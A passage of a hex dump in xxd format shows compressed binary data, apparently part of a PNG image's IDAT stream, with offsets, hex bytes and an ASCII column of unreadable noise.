00005340: 7ee0 9545 eebf 633b 95ac 9ee8 4375 3d59  ~..E..c;....Cu=Y
00005350: 2932 5602 18d3 7434 145b 068b da6d fb0a  )2V...t4.[...m..
00005360: fcda 7d9b 8faf bf9e a309 fecd 8706 d473  ..}............s
00005370: 876b 0f9d 9ced 3ef1 471f dba5 fed3 47af  .k....>.G.....G.
00005380: 506f 7a6a 5012 9697 bb74 bd88 7d5b 2a1f  PozjP....t..}[*.
00005390: 7dee d8ea e2fe 4333 3bfe f507 7729 c7d2  }.....C3;...w)..
000053a0: 9042 525b 7559 6dfb 7871 bc78 d5f6 22d7  .BR[uYm.xq.x..".
000053b0: ef1c c877 bce8 eb2b 8d80 ef3e f62a 8f7f  ...w...+...>.*..
000053c0: f318 6e37 e2fa 3dfd 3cfb d245 3acd 1811  ..n7..=.<..E:...
000053d0: c71b d6ec 285c 8765 2695 7f14 81a6 1491  ....(\.e&.......
000053e0: 4a2a d99f 7493 9341 92c1 3db7 96a8 5675  J*..t..A..=...Vu
000053f0: 768e a5b8 7667 8ec4 c0bb b6ab ad7d cfe5  v...vg.......}..
00005400: ab48 c8e2 524c b3e5 3271 7185 66d7 65a5  .H..RL..2qq.f.e.
00005410: d1c1 f33c 2cd3 a090 7570 6c1d 508c 8d8e  ...<,...upl.P...
00005420: 7061 bace d4d4 3c02 49b1 94c3 f502 7c2f  pa....<.I.....|/
00005430: c4d0 35b2 5907 05d4 6bab 48bf 850c 7dc2  ..5.Y...k.H...}.
00005440: 5e8b a8d7 4285 1eb1 5274 bb3e 17a6 1639  ^...B...Rt.>...9
00005450: 7e7c 92a9 a939 5029 3286 e4ba 1d79 4a69  ~|...9P)2....yJi
00005460: 9398 8094 21b8 6187 c5dd 37e8 bb75 9438  ....!.a...7..u.8
00005470: 0000 2000 4944 4154 1886 4229 8d97 4e75  .. .IDAT..B)..Nu
00005480: 79fe 5887 63e7 3b98 8685 ae83 6608 7403  y.X.c.;.....f.t.
00005490: 7403 94d4 e978 21ff f8c2 240f ddbd 834a  t....x!...$....J
000054a0: 5ee3 f38f cdf1 d51f d5d9 3c58 a45c 48f1  ^.........<X.\H.
000054b0: b6eb 07b9 7647 0525 2359 6f28 669a 2e08  ....vG.%#Yo(f...
000054c0: 03db b2f9 e407 cbea 4707 9bf7 3d7b bafd  ........G...={..
000054d0: edeb b615 fed0 0f42 66eb 9dd7 b526 6f54  .......Bf....&oT
000054e0: 28c5 c0ef fd8f 1322 6d5b fc9f 1fd8 a2c2  (......"m[......
000054f0: 2898 78ea f8ea d342 9fda fb89 f76f 577f  (.x....B.....oW.
00005500: f18d 49f1 5f1f 9914 295d 6764 c8a1 9c11  ..I._...)]gd....
00005510: d886 89d0 857d df3d db71 3b31 4fbd 7081  .....}.=.q;1O.p.
00005520: b75c bf99 1f3c 3f49 a713 605a 62ed 48b5  .\...<?I..`Zb.H.
00005530: deef 8e51 5225 c513 c9c0 27f9 9cf4 0676  ...QR%....'....v
00005540: 8ea5 c838 1aa7 cef7 36a4 d8b1 a671 f3ae  ...8....6....q..
00005550: 0cbb 8604 b65e 607a d943 d715 a6a9 1385  .....^`z.C......
00005560: 124d 935c bb33 bbf1 3d52 82d4 34de 7e43  .M.\.3..=R..4.~C
00005570: 8e3d e31a 2bcb 2b4c 4c2d 1309 93ac 6313  .=..+.+LL-....c.
00005580: 040e 857c 0ea1 2519 d071 1891 c966 e9af  ...|..%..q...f..
00005590: 5698 9e59 c2b2 0c46 c706 6936 3b78 5e80  V..Y...F..i6;x^.
000055a0: b6e6 3072 7d49 cf8f b10c d0ad 184d 0534  ..0r}I.......M.4
000055b0: 1a5d 6616 7bd4 9b92 72d1 61b5 19f0 f40f  .]f.{...r.a.....
000055c0: 5ee2 896f 3e8b 5328 72cd 8e1c bbc6 2c8a  ^..o>.S(r.....,.
000055d0: 7983 d95a 9070 170c 451c aab5 e9ac a4d6  y..Z.p..E.......
000055e0: 8ca8 b7bb 6b64 79b1 e11b 314c b052 da06  ....kdy...1L.R..
000055f0: 5ebb e50a 7e78 e002 ef79 eb0e 5e3c 56e3  ^...~x...y..^<V.
00005600: bd0f 5e4b be60 f2c5 2f1f 626c d022 6708  ..^K.`../.bl."g.
00005610: 745d 2bfe ce5f 9f12 32d2 c898 824f bc6f  t]+.._..2....O.o
00005620: bb7a f2d0 ec07 0e9c 693e 71d7 9ed2 47af  .z......i>q...G.
00005630: df6b ffce affd d184 e845 bdcb 3604 637d  .k.......E..6.c}
00005640: faa8 9442 d724 0881 17fb 7cf6 9173 e253  ...B.$....|..s.S
00005650: 1fde a9d0 e5dd cf1e 6d3e 4dcc de4f bc77  ........m>M..O.w
00005660: 87fa efdf 3c2b bc38 647e 49f1 5f1f b978  ....<+.8d~I._..x
00005670: 7d10 0427 8706 9c7f 3042 9f20 0cb9 e6ca  }..'....0B. ....
00005680: 2adf 7cf2 142d 37c4 d405 594d c70f d728  *.|..-7...YM...(
00005690: 255a 3253 cfa6 0581 2fd0 6241 10c7 0843  %Z2S..../.bA...C
000056a0: 10c7 3a29 5362 5bda 8fdd 643d 561c 9f72  ..:)Sb[...d=V..r
000056b0: 2915 329c 9af6 989e ef31 5831 01c5 de7d  ).2......1X1...}
000056c0: 5b29 55f2 f497 6cfa c73d 9697 9bcc 2fae  [)U...l..=..../.
000056d0: 10b6 3a1b df33 3e92 657c a84a a990 c336  ..:..3>.e|.J...6
000056e0: 9255 2796 125d d388 a4c0 f37c daed 2ed7  .U'..].....|....
000056f0: 5dbd 89c3 c70d ce5d 5cc5 c9b4 c8a5 74c2  ]......]\.....t.
00005700: a083 7034 425f 9149 db94 8a23 b45b 6d34  ..p4B_.I...#.[m4
00005710: 5da7 582a d20d 0ca4 0186 ee32 bfd0 4c3c  ].X*.......2..L<
00005720: 0346 8a6c b544 e805 4cd7 63fa 4b26 334b  .F.l.D..L.c.K&3K
00005730: 3d74 6190 cfe8 e842 e046 16b6 63d1 6925  =ta....B.F..c.i%
00005740: 5955 9a26 b00d d085 4e25 6bd1 5fb1 70d2  YU.&....N%k._.p.
00005750: 26c5 b445 2015 281d 4148 bd2b f9d1 cbb3  &..E .(.AH.+....
00005760: 3cf8 b6dd 640a 6932 b92c 9592 c517 1fab  <...d.i2.,......
00005770: 7f46 c66e 6bb6 e635 d004 8e1d f3af de3b  .F.nk..5.......;
00005780: a29e 3c74 f103 2f9c 0d1e b97b 6ff1 b76f  ..<t../....{o..o
00005790: b8a2 fad9 fff2 d50b c28b 7c84 d27e b630  ..........|..~.0
000057a0: 657d 52f5 175f 3d2b 7efd 1777 2aa4 7ef7  e}R.._=+~..w*.~.
000057b0: 7327 1a4f 6bc6 cc6d bff6 bead ea73 8f4e  s'.Ok..m.....s.N
000057c0: 8a38 969c 3adf 3cb4 63dc 1ebb 7557 df03  .8..:.<.c...uW..
000057d0: 7ffe 0f67 b8ff d611 9e78 768e e56e e25a  ...g.....xv..n.Z
000057e0: 16a6 4e24 2008 144e 4647 d7b5 0d4c 4d1c  ..N$ ..NFG...LM.
000057f0: c708 0dc2 40a0 1b1a 6128 d184 e4d4 f92e  ....@...a(......
00005800: 8315 9366 2724 9332 92ad 4283 b95a c8e4  ...f'$.2..B..Z..
00005810: bc60 a5e9 1185 8a42 2ecb dd77 efe2 1df7  .`.....B...w....
00005820: ddcc 55fb b652 c8a7 595c 6c72 e8f0 598e  ..U..R..Y\lr..Y.
00005830: 1e3d cbb7 1f7b 91d9 c51e bed1 cf8d 37ec  .=...{........7.
00005840: 64cf 9e71 62a9 e3fa 31e9 741a d3d0 e976  d..qb...1.t....v
00005850: 3bcc 2f2c b130 5bc3 8f15 235b 4cae b97a  ;./,.0[...#[L..z
00005860: 1b42 06cc 4c4d 31b9 ec71 e5ce 2126 262e  .B..LM1..q..!&&.
00005870: d03f 3848 ffc8 1071 9c14 a24b b526 4249  .?8H...q...K.&BI
00005880: 72f9 1cd5 82cf a913 5358 8ec5 8fbe f724  r.......SX.....$
00005890: 878e 9ca1 b6aa 18ea b359 5c0a 992b c69c  .........Y\..+..
000058a0: 5f80 1d63 8292 9dda 40ed 1b46 a277 348c  _..c....@..F.w4.
000058b0: 24b7 229f 7708 a304 5d68 da1a 694b 279f  $.".w...]h..iK'.
000058c0: b613 ade2 5ad6 83d0 14f5 66c4 f7f7 4ff0  ....Z.....f...O.
000058d0: 2e33 e2fb c75b ecd8 94e7 f4f9 dad6 9393  .3...[..........
000058e0: ed5f 157a 4446 d7f8 d507 77ab 670e 5efc  ._.zDF....w.g.^.
000058f0: d707 cf78 8fdc bd37 f59f 6fd8 d9f7 a93f  ...x...7..o....?
00005900: 7ae4 bcf0 c39f a250 ba94 f4bd 8ed3 574a  z......P......WJ
00005910: d28b e18f feee 8cf8 f407 f7a8 406a 832f  ............@j./
00005920: beb6 7a20 8aec f1ff e3a1 5dea 7f7c ef84  ..z ......]..|..
00005930: 181f b0af 7bfb 8da3 07bf f4f8 39f1 2bef  ....{.......9.+.
00005940: deae fefe 07d3 acb6 5d6c 4343 9749 5857  ........]lCC.IXW
00005950: 6c80 efc6 8976 5013 acb6 43da 3d89 8c05  l....vP...C.=...
00005960: a6ae e8f8 5030 15bd b5dc 8328 8cd1 3010  ....P0.....(..0.
00005970: 2244 9164 3ec4 52c3 d262 6aad 2e9b ab69  "D.d>.R..bj....i
00005980: b2bb 0afc ab8f 3ec0 bdf7 de44 bb17 a209  ......>....D....
00005990: 4518 2600 cde1 9132 37ee bb93 eb76 55f9  E.&....27....vU.
000059a0: abbf 7906 610a c230 a4eb 860c 0f95 e976  ..y.a..0.......v
000059b0: 5de2 c063 76a5 4bb7 d366 7961 89e7 0e4c  ]..cv.K..fya...L
000059c0: f1e1 7ff9 5e0a 5913 a102 4c43 a754 ae50  ....^.Y...LC.T.P
000059d0: 5b9d a6e3 8614 fb47 0831 e8b4 7db2 f90c  [......G.1..}...
000059e0: 99ac c381 174f 5149 fbec dc31 c660 c5e2  .....OQI...1.`..
000059f0: faab 8658 aa35 5958 6a32 b724 18a9 58b4  ...X.5YXj2.$..X.
00005a00: 5b31 c5ac 4910 4b74 2d01 e45e 98f5 3834  [1..I.Kt-..^..84
00005a10: d9e3 c051 49d6 1428 4d50 cdd9 347b 21a5  ...QI..(MP..4{!.
00005a20: bc4e c74b ea28 b7ab a8e4 7572 799d 6e28  .N.K.(....ury.n(
00005a30: 4017 e8ba 8688 2441 2499 5eec f2e8 7727  @.....$A$.^...w'
00005a40: b9eb e63e fee7 e367 7ff9 c13b 87bf ecf9  ...>...g...;....
00005a50: f2c5 da62 f773 1fb8 6f48 3d7f 70fa f387  ...b.s..oH=.p...
00005a60: 277a 7f72 dd8e f283 37ee aa7c ea8f bf7e  'z.r....7..|...~
00005a70: 4ef8 9142 88f8 9f2e 555b 5f19 1e7b 715e  N..B....U[_..{q^
00005a80: dc72 654e 1d3a 5117 87ce d4a7 0d9d db3e  .reN.:Q........>
00005a90: f28e 9d2a 908a bff9 ee84 e8ba 316d b7cb  ...*........1m..
00005aa0: c5a5 16b6 26d1 9481 49f2 10c4 714c bb17  ....&...I...qL..
00005ab0: 50c8 a430 0d63 6342 194b 856d 0994 a7d6  P..0.ccB.K.m....
00005ac0: dac5 7223 f052 c968 6396 a0eb 02d7 0d71  ..r#.R.hc......q
00005ad0: 1c93 8bb3 011f ff97 3772 fb5b 6fe0 aaab  ........7r.[o...
00005ae0: b6e0 0709 416d 7e66 91e9 991a 3d3f c249  ....Am~f....=?.I
00005af0: 694c 9ee9 3177 6186 4ed7 6571 41a7 beda  iL..1wa.N.eqA...
00005b00: a156 6fa3 e916 52c6 a44d 9578 096a 4dda  .Vo...R..M.x.jM.
00005b10: ad80 5bee bc85 814a 9a76 bb8b 1010 1a26  ..[....J.v.....&
00005b20: 52b3 d9ba 632b 878f 9ca1 52ce b179 7c80  R...c+....R..y|.
00005b30: b463 8354 189a 62d7 ce11 2c5c ecb4 43ca  .c.T..b...,\..C.
00005b40: 7640 c0c2 dc0c 9d4e 0822 c24e a558 6a86  v@.....N.".N.Xj.
00005b50: ecde e230 b7e4 53cc 98f8 8102 11d1 eb19  ...0..S.........
00005b60: ccd7 16d9 355a 62df b62c 576f cf32 b910  ....5Zb..,Wo.2..
00005b70: d08d 7566 a65c 9c4c b23d e652 16a5 9c83  ..uf.\.L.=.R....
00005b80: e772 59c2 0d24 3e86 0b0b 7043 dba3 d9f5  .rY..$>...pC....
00005b90: fff6 2bdf bff0 770f dd52 8dc5 dec2 5f3e  ..+...w..R...._>
00005ba0: 7764 fe4f 5f99 707f 4b2a b87e 9bfd ad6f  wd.O_.p.K*.~...o
00005bb0: bf30 27dc 28fa 596e e8cb e5d1 0970 294e  .0'.(.Yn.....p)N
00005bc0: 524e 5432 e009 a30e 422b 26b5 9b94 bc7c  RNT2....B+&....|
00005bd0: b276 e0e0 e9ba b04c b981 d2d1 6320 9644  .v.....L....c .D
00005be0: e884 b146 a46b c44a 1029 586d c68c 0d5a  ...F.k.J.)Xm...Z
00005bf0: a453 1a86 9920 7850 6bd9 c92a 2216 8298  .S... xPk..*"...
00005c00: 4463 af6b 8a4e 2828 644c a230 62b0 a4b1  Dc.k.N((dL.0b...
00005c10: d292 a045 ecdc 5ee6 6def b891 6bf6 6dc5  ...E..^.m...k.m.
00005c20: 3435 9450 1c7d f51c c75e 3dcb b1a3 67d1  45.P.}...^=...g.
00005c30: ac14 4343 2596 66a7 e9ac d699 98ea 502e  ..CC%.f.......P.
00005c40: 8844 76d6 ed72 bade 2597 b5d9 b6a9 8269  .Dv..r..%......i
00005c50: 5980 4126 9b63 dbf6 7e96 9656 d004 2804  Y.A&.c..~..V..(.
00005c60: 4137 c40f 2585 6296 52a5 8cdb f3e8 745c  A7..%.b.R.....t\
00005c70: f2b9 349a 2e08 3c8f f1d1 3e54 e4e2 793e  ..4...<...>T..y>
00005c80: 7ee0 2354 c8f1 63e7 6875 ba14 6c03 5d24  ~.#T..c.hu..l.]$
00005c90: 27a5 b4ae 1346 117b b7e4 989c ef71 d5d6  '....F.{.....q..
00005ca0: 326d 3799 8c6a 5a88 1f25 2da7 288e 4899  2m7..jZ..%-.(.H.
00005cb0: 169a aee3 a415 b695 229d 31c9 e62d 2e2e  ........".1..-..
00005cc0: b808 e3d2 40b4 7003 8ca5 6444 2821 f403  ....@.p...dD(!..
00005cd0: f9a5 2766 441c c749 2b59 08a4 1625 742c  ..'fD..I+Y...%t,
00005ce0: 9558 dac2 9f24 325e 0f1d fde7 e810 5edf  .X...$2^......^.
00005cf0: 5212 dfc2 7ace 711c 2be2 5827 8a12 72f8  R...z.q.+.X'..r.
00005d00: ec72 9bab 760c 6e78 fade 40e3 208e e335  .r..v.nx..@. ..5
00005d10: 6d61 8c65 eab4 1a21 0343 193a ad38 6135  ma.e...!.C.:.8a5
00005d20: ad35 8d7e f55f dccb b66d c358 9686 0c3d  .5.~._...m.X...=
00005d30: 96ea 1e07 9e7e 8967 9e7a 09a5 2008 0c9e  .....~.g.z.. ...
00005d40: 793a e6ca 9d59 4e4d 7401 4118 7a28 1962  y:...YNMt.A.z(.b
00005d50: 0849 0858 a681 920a 2115 f97c 8eb4 9322  .I.X....!..|..."
00005d60: 9736 78e9 cc45 b68e 9511 9145 a717 e1f9  .6x..E.....E....
00005d70: 3e51 2cb9 f28a 5116 169b d4ea 4da4 540c  >Q,...Q.....M.T.
00005d80: f617 88a4 2495 3541 8b59 aeb5 70dd 1e5e  ....$.5A.Y..p..^
00005d90: a7cd a3ff f02c 5e60 70fd 1579 da7e 40c6  .....,^`p..y.~@.
00005da0: 8e30 d336 1ff9 85eb 1317 b499 a2af 9c62  .0.6...........b
00005db0: 7aa1 cb5b 6ebb 1227 65b1 b0d4 64a0 9266  z..[n..'e...d..f
00005dc0: cb6e 835e b7c7 6d37 5be4 7326 cdd5 1ec3  .n.^..m7[.s&....
00005dd0: 7d69 4a39 9313 a77b 97d8 11d7 3f12 59fa  }iJ9...{....?.Y.
00005de0: a52b 4512 2ffc bf96 e6f2 d3b7 0671 89f2  .+E./........q..
00005df0: f532 69bb da80 406b 5ab2 cf25 e98d 3a28  .2i...@kZ..%..:(
00005e00: 8d18 49a4 24b1 d289 9460 69b9 8dd0 c718  ..I.$....`i.....
00005e10: aa38 3829 1d53 d3f0 b504 ff66 9b2a e135  .88).S.....f.*.5
00005e20: 3a82 5a57 26b8 5b5f a1e2 8056 47e2 0692  :.ZW&.[_...VG...
00005e30: 2854 94b3 3ab7 ddb2 0b8d 906e b74b abed  (T..:......n.K..
00005e40: f3ef 3ff3 37cc 2f2e 6158 060b 2b31 ba99  ..?.7./.aX..+1..
00005e50: a4ac bd36 d9dd e83c 1e3f ebf3 b67a 0fc3  ...6...<.?...z..
00005e60: 34b9 72cb 204e 264b a7d9 c4eb f628 e41c  4.r. N&K.....(..
00005e70: 2afd 7dd8 9646 2e6b 2712 762d 59b5 6257  *.}..F.k'.v-Y.bW
00005e80: 21e3 08db d418 1b29 d36e 7539 797a 9a4e  !......).nu9yz.N
00005e90: b7c7 ce5d 5b40 4114 c5b8 41cc d47c 9b95  ...][@A...A..|..
00005ea0: 8565 624d 270e 147e 2c51 c2e1 86ab fab8  .ebM'..~,Q......
00005eb0: eeba 313e f8e0 55e4 320e 8562 965e cf25  ..1>..U.2..b.^.%
00005ec0: 0c24 8562 864e d725 0a63 8ac5 2cdd b5eb  .$.b.N.%.c..,...
00005ed0: c225 d7af 1e3a 8761 c26a db45 1349 1e86  .%...:.a.j.E.I..
00005ee0: a625 29f2 9a2e 106a 2d89 574b 721a f4b5  .%)....j-.WKr...
00005ef0: 1cc9 d783 cdf5 cb6e a08c 93d6 fb1b 656b  .......n......ek
00005f00: eae7 f535 bcb1 66b8 1cec 0c9b 062b 386b  ...5..f......+8k
00005f10: 6195 89a7 21d1 21c4 71e2 d1f7 62c1 6ac7  a...!.!.q...b.j.
00005f20: 63d3 688e 6cca 64a0 a031 5a36 8925 58d6  c.h.l.d..1Z6.%X.
00005f30: 256f 4126 69b1 028d 2088 c9e4 74c2 008a  %oA&i... ...t...
00005f40: 2587 5ffc a5db e9f4 5c6c e113 bb6d 4e9e  %._.....\l...mN.
00005f50: 5b40 4fd9 cc2f fbc4 b1c0 34d6 a458 4abf  [@O../....4..XJ.
00005f60: ac29 b5b9 3f21 9776 3d89 8ad7 8eb4 f90c  .)..?!.v=.......
00005f70: 866d 6399 0669 5bc3 f73d b68f f731 d85f  .mc..i[..=...1._
00005f80: a1bf 9225 93d2 09fc 9094 053d 37a4 d5f6  ...%.......=7...
00005f90: a996 d358 86e4 e4a9 196c 5b27 0e03 966b  ...X.....l['...k
00005fa0: 755a ad36 0b8b 2b1c 3e7c a239 3458 c40f  uZ.6..+.>|.94X..
00005fb0: 620e 9e6c 71cd f557 f0b1 8fde c9af bcff  b..lq..W........
00005fc0: 7ac6 0773 38b6 6076 a149 d616 3836 cc2e  z..s8.`v.I..86..
00005fd0: 34c9 a704 e9b5 7fcf a5c4 c6d7 e452 82f3  4............R..
00005fe0: e717 4889 8866 277a 3dbd 6e2d ff52 d775  ..H..f'z=.n-.R.u
00005ff0: 0c5d 47d7 9218 a2d1 4afa 2b02 f1cf 5299  .]G.....J.+...R.
00006000: 69eb 3755 8835 5712 eac7 9e98 5868 5cbd  i.7U.5W.....Xh\.
00006010: 3dc5 559b f26b 5cbe f519 95c5 9691 340f  =.U..k\.......4.
00006020: dd59 5152 ea1b 0f47 a414 9132 8894 2056  .YQR...G...2.. V
00006030: 10cb 90c5 9acb 709f 4d3e 6b52 caa5 48a7  ......p.M>kR..H.
00006040: 742c a161 ea06 abad 98a5 8624 0ea1 e76b  t,.a.......$...k
00006050: a4d3 8ae5 4694 0c90 488e 55d7 5e35 4a5f  ....F...H.U.^5J_
00006060: c9a2 542d e106 f0e2 fec3 2c2d 2eb1 d208  ..T-......,-....
00006070: 98ad 4534 db11 dd9e 229b 9197 751e 6fbd  ..E4...."...u.o.
00006080: ed2a d222 e0d4 8973 9c9d 98e6 d0cb 4768  .*."...s......Gh
00006090: aeae 3230 50a1 5c2d e0fb 1e96 6992 49a7  ..20P.\-....i.I.
000060a0: c866 2cea f516 8b4b 0d8a 0587 7229 4d7d  .f,....K....r)M}
000060b0: b541 adde 6476 b185 d452 6cdb 3a82 f23d  .A..dv...Rl.:..=
000060c0: 2627 a779 6aff 49a2 1846 07cb 9c3c 7aaa  &'.yj.I..F...<z.
000060d0: 3038 9067 6cdb 188f 7de5 7fe7 339f bc93  08.gl...}...3...
000060e0: bd3b cb2c af74 b8b0 1420 359b 6a29 fd73  .;.,.t... 5.j).s
000060f0: 5d1f 9b68 71e4 f079 06fa 5234 db97 c429  ]..hq..y..R4...)
00006100: 1a3a 866e a069 1642 07cd 5008 74de 75f3  .:.n.i.B..P.t.u.
00006110: d82f 0e55 edff 3b91 99e9 48a1 50c2 64cf  ./.U..;...H.P.d.
00006120: 68f6 ae7d bb9c b5fc c84b 3ac8 424b 3ea4  h..}.....K:.BK>.
00006130: 8e8c 75d4 cf9b d760 1a06 4727 02ee bb6b  ..u....`..G'...k
00006140: 4089 6784 387e b1b9 f618 c5bc f3f6 6dea  @.g.8~........m.
00006150: 6fbf 35c1 87ee 7bbd b77e f39e 3ea6 e7ba  o.5...{..~..>...
00006160: f47c 8f28 d288 429d 3317 5b3c 74e7 28d5  .|.(..B.3.[<t.(.
00006170: 82c5 c585 7642 1c0d 1352 b969 1a44 6192  ....vB...R.i.Da.
00006180: 8eee 0721 85bc 056e 8494 3a86 1990 760c  ...!...n..:...v.
00006190: 4606 9374 16cf 979c bdb0 ca7f facb 67b9  F..t..........g.
000061a0: e3ba 3299 8c4e b311 ad59 f262 b269 f3b2  ..2..N...Y.b.i..
000061b0: a6d4 8973 2b2c ae74 18ac 2ea3 bc2e a974  ...s+,.t.......t
000061c0: 0627 eb50 2ce4 5118 747a 3e8e 03a7 2796  .'.P,.Q.tz>...'.
000061d0: d8b6 a59f 300c 5151 8088 62ba 5d8b 95e5  ....0.QQ..b.]...
000061e0: 5562 92d5 6bb0 bfcc f060 1125 25e7 cf4d  Ub..k....`.%%..M
000061f0: 1284 12c3 3008 c388 c14a 86eb 6ede c735  ....0....J..n..5
00006200: 57bb 2ccf 2f41 1c50 2815 4865 d31c 3d76  W.,./A.P(.He..=v
00006210: 9195 5a0b db36 c9e6 9c9f 7a6d 5906 b5a5  ..Z..6....zmY...
00006220: 5586 fa4c 2a45 9b53 e79b 6bbe 0630 2230  U..L*E.S..k..0"0
00006230: f331 9bb3 695e 9b6c a1af 15f3 dfdc 7f81  .1..i^.l........
00006240: fb6e 1bfa fdbf fef6 c41f 689a 00a1 d839  .n........h....9
00006250: 927a c77d b7e5 be7f e64c f8f3 ad08 3fcd  .z.}.....L....?.
00006260: f890 1cf5 2471 2089 85cb 5f3f 3227 eebf  ....$q ..._?2'..
00006270: 7354 eddb 5c4c 5c4e 488c b04b c377 4128  sT..\L\NH..K.wA(
00006280: 3443 e38e 1b06 78f0 f611 7ef9 fe4d 9453  4C....x...~..M.S
00006290: 6922 09be 0c99 5f6c 1304 92dd db0a a433  i"...._l.......3
000062a0: 36a1 0f29 5ba3 db8b 2964 7424 2271 e920  6..)[...)dt$"q. 
000062b0: 5051 8c63 0bea 0d9f 6a29 43da b128 970b  PQ.c....j)C..(..
000062c0: a433 7994 82fe 6a8e 3fff ec07 f17b 0d32  .3y...j.?....{.2
000062d0: f69a 8f4f 8065 0a7c 5f71 ea7c 97c5 5a48  ...O.e.|_q.|..ZH
000062e0: cf8f 387a 6291 c7fe f13c f30b 0d4c 0346  ..8zb....<...L.F
000062f0: c706 09a3 9820 f068 773a cc2d 3408 7c8f  ..... .hw:.-4.|.
00006300: d985 65a6 a767 596d 7688 7c8f a055 a3db  ..e..gYmv.|..U..
00006310: 6ee1 b93e f9ac c540 35c7 407f 8162 3e45  n..>...@5.@..b>E
00006320: 18c5 f43a 5df6 ee19 278e 24bd 569b 6bae  ...:]...'.$.V.k.
00006330: dbc3 689f c315 dbaa 64f2 3956 1a2e 1766  ..h.....d.9V...f
00006340: 1b34 3b31 a3c3 1576 ed1c 2495 767e e675  .4;1...v..$.v~.u
00006350: bbe3 631b b065 b488 2b05 5d37 4418 0243  ..c..e..+.]7D..C
00006360: 2872 6983 fb6f 19e1 6d37 8eb0 6f67 114b  (ri..o..m7..og.K
00006370: 03a5 1bf4 0285 2044 4347 28c9 eee1 c26f  ...... DCG(....o
00006380: bfeb 8ef2 f7ff ea5b cbc2 17d1 5ae4 8f76  .......[....Z..v
00006390: 19a7 f98d 45e5 3fe9 d450 f75c bef0 b509  ....E.?..P.\....
000063a0: f189 5fd8 a62e 3e7a 46b8 d1fa 9eb5 360d  .._...>zF.....6.
000063b0: 4b19 5cbf b9c4 85c9 1eaf 9c5d fecc 7bee  K.\........]..{.
000063c0: dbf2 fb8f ff68 9a20 0a88 23c1 c44c 872b  .....h. ..#..L.+
000063d0: b694 e87b 6589 79cd 239d 1174 bce4 e4a0  ...{e.y.#..t....
000063e0: aff1 13c6 b70e b367 4711 4d29 8e9e 5c20  .......gG.M)..\ 
000063f0: e875 717b 2189 3033 45c6 845d 3b06 2996  .uq{!.03E..];.).
00006400: d27c f54b 8f10 c7eb ab86 4eda d468 7543  .|.K......N..huC
00006410: a210 340c a228 a909 3414 be34 a894 f36c  ..4..(..4..4...l
00006420: 1e2d 7061 6695 b367 6741 087a 7ec4 40c9  .-paf..ggA.z~.@.
00006430: 24a5 85b4 5657 0964 0a43 08f2 790b 4344  $...VW.d.C..y.CD
00006440: 3869 0721 2350 4682 b3b1 7442 5f92 ca16  8i.!#PF...tB_...
00006450: 181e 2a70 e2e4 34cb 0b0b 5cb1 b58a 8c7c  ..*p..4...\....|
00006460: faaa 15ac 4c1a b7db a3dd f1d0 45cc e6cd  ....L.......E...
00006470: 151c 5b63 66ae 41a5 927f d36b 2523 5e39  ..[cf.A....k%#^9
00006480: 7086 d1a1 34a3 0305 5657 5c74 5d47 d362  p...4...VW\t]G.b
00006490: d24e 867d 7b4a 1c39 b1c4 a6a1 2431 e6d4  .N.}{J.9....$1..
000064a0: 852e 9aa6 61ac 6911 3543 61eb 3aef bcbd  ....a.i.5Ca.:...
000064b0: fcd9 cf3f 7a51 f4da f146 34a0 92ea 679f  ...?zQ...F4...g.
000064c0: 1a92 51f0 2546 0825 37c4 0fa0 f1de bb86  ..Q.%F.%7.......
000064d0: d4e6 be22 8f17 5659 6976 e9b8 5d6c 4347  ..."..VYiv..]lCG
000064e0: 290d 4d33 b0cc 1874 c8e8 0a37 8a08 2c9f  ).M3...t...7..,.
000064f0: a546 f007 8f3d 39f1 f87b eed9 79f0 fbcf  .F...=9..{..y...
00006500: 9ec3 978a 6367 6a7c e85d bbd8 349a 676a  ....cgj|.]..4.gj
00006510: 31a4 d9f1 b00d 8954 21db 3765 e9ef cb73  1......T!.7e...s
00006520: c72d 3bd8 bead 0f94 62df 1503 3cf6 cc04  .-;.....b...<...
00006530: a3d5 2c2b f516 6363 4398 9685 2e13 cde4  ..,+..ccC.......
00006540: 15d7 ec63 e289 1354 4b19 5a9d 1e52 4f88  ...c...TK.Z..RO.
00006550: e498 624d 1a27 e9ad 6929 7aae 4fab d521  ..bM.'..i)z.O..!
00006560: f65a 9c3f bfc4 ccc5 6576 ed1c 62c7 ce61  .Z.?....ev..b..a
00006570: 1acb 8ba4 75a8 96cb acb6 5c6c 274d dfd8  ....u.....\l'M..
00006580: 009e e792 d574 ce9d 3881 e9e4 b9e2 ca1d  .....t..8.......
00006590: 948a e9a4 f925 4c96 6a4d baad 267a d8c5  .....%L.jM..&z..
000065a0: d4d2 14fa f318 46cc ccd4 0c43 fd39 aebe  ......F....C.9..
000065b0: a29f 580a 2e4c 4d33 bfec 1205 3ea1 5b7c  ..X..LM3....>.[|
000065c0: d3eb e75f 9e21 5fb0 191e ca51 2ca4 3879  ..._.!_....Q,.8y
000065d0: 6105 5dd7 4939 367b 7794 79e1 c822 9e27  a.].I96{w.y..".'
000065e0: 9022 2288 0c32 b68e 691a a42c 10ba 45ca  .""..2..i..,..E.
000065f0: d01d 5d17 d576 3ba2 ddf5 2816 74ae db5e  ..]..v;...(.t..^
00006600: a094 b7d5 ff33 d515 6aad 5650 6abd 8720  .....3..j.VPj.. 
00006610: 3672 247f ae15 a1bf 94a2 e848 b2d9 342b  6r$........H..4+
00006620: cd6e 72c4 3274 4c11 639a 5048 dba4 4d9d  .nr.2tL.c.PH..M.
00006630: 6cca 2065 6a84 b181 a609 661a fea1 c79f  l. ej.....f.....
00006640: 3dfb d043 77ed fad6 0f0e 9ca5 de0a 59aa  =..Cw.........Y.
00006650: 75b8 694f 1f27 261b acb6 219b d7d9 3a9c  u.iO.'&...!...:.
00006660: e1ad b76c e58a 3d9b d83a 9ca5 de8d e82b  ...l..=..:.....+
00006670: a5b8 fb96 713e f2c1 5b38 777e 0545 b27d  ....q>..[8w~.E.}
00006680: 78ae 8b0c 5c2a 1993 fbef bf95 e70f ce11  x...\*..........
00006690: f55a b4dd 44f0 8ad0 9151 c452 e772 574f  .Z..D....Q.R.rWO
000066a0: 3a65 5128 e431 3379 6ebf 6b98 4cca a4eb  :eQ(.13yn.k.L...
000066b0: fabc 767a 9eda ec14 f7bc e376 b299 14c5  ..vz.......v....
000066c0: 620f 3b95 c248 d934 db2e b5a5 05c6 370f  b.;..H.4......7.
000066d0: e364 f2a0 24f3 f375 1aab 0d8e bf76 8199  .d..$..u.....v..
000066e0: a51e b75e 33c2 ad37 ed24 0815 41b7 c9e1  ...^3..7.$..A...
000066f0: 83c7 d8b1 6308 5b87 575e 3ec7 b999 5586  ....c.[.W^>...U.
